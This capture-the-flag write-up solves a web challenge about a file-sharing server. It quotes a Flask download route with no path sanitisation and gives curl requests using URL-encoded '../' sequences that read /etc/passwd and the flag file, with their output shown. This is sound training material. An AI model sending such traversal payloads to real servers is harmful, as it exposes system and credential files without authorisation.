# SSFS
I made a file server to easily share my files with my friends. Nobody has hacked it yet, so I'm sure it's secure.

https://ssfs.challs.pwnoh.io

## Data
* [SSFS.zip](https://bctf-24-stage1.s3-us-east-2.amazonaws.com/d03847995755b8a1a8e2a5cb04047523a14740f8dcf724bf754706f233925d93/SSFS.zip)

## Solution
The website has the functionality to upload, search and download a file. The interesting part of the source code is the download part:
```python
@app.route('/download/<path:file_id>')
def download(file_id):
    file_id = filter_file_id(file_id)

    if file_id is None:
        return {'status': 'error', 'message': 'Invalid file id'}, 400

    if not os.path.exists('uploads/' + file_id):
        return {'status': 'error', 'message': 'File not found'}, 404
    
    if not os.path.isfile('uploads/' + file_id):
        return {'status': 'error', 'message': 'Invalid file id'}, 400

    return send_file('uploads/' + file_id, download_name=f"{file_id}.{file_exts.get(file_id, 'UNK')}")
```

The entered path is not further checked. The only check is if the file exists and if it's a file. So we can access any file that we want in the system, called Directory Traversal:
```
$ curl https://ssfs.challs.pwnoh.io/download/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2f%2fpasswd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
$
```
_`%2e%2e%2f` is the url encoding for `../`_

From the source file, we know that there is file called `flag.txt`. So let's try to access it:
```
$ curl https://ssfs.challs.pwnoh.io/download/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fflag.txt
bctf{4lw4y5_35c4p3_ur_p4th5}
$
```

Useful links:
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md
* https://owasp.org/www-community/attacks/Path_Traversal
* https://en.wikipedia.org/wiki/Directory_traversal_attack
